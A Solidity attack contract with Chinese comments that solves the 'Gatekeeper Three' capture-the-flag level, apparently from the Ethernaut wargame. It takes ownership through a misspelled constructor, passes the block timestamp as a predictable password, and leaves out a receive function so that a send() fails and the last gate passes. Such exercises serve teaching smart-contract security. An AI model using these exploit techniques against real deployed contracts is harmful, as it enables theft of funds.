// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function construct0r() external;
    function createTrick() external;
    function getAllowance(uint256 _password) external;
    function enter() external;
}

contract GatekeeperThreeAttack {
    IGatekeeperThree public target;
    
    constructor(address _target) {
        target = IGatekeeperThree(_target);
    }
    
    function attack() external payable {
        // Step 1: 成为 owner（利用构造函数拼写错误）
        target.construct0r();
        
        // Step 2: 创建 SimpleTrick 合约
        target.createTrick();
        
        // Step 3: 获取密码并设置 allowEntrance
        // 密码就是当前区块时间戳
        uint256 password = block.timestamp;
        target.getAllowance(password);
        
        // Step 4: 向目标合约发送 ETH（> 0.001 ether）
        payable(address(target)).transfer(0.002 ether);
        
        // Step 5: 调用 enter()
        // gateThree 会尝试 send(0.001 ether) 到 owner（即本合约）
        // 因为本合约没有 receive/fallback，send 会失败，通过 Gate Three
        target.enter();
    }
    
    // 故意不实现 receive() 或 fallback()，让 send() 失败
}
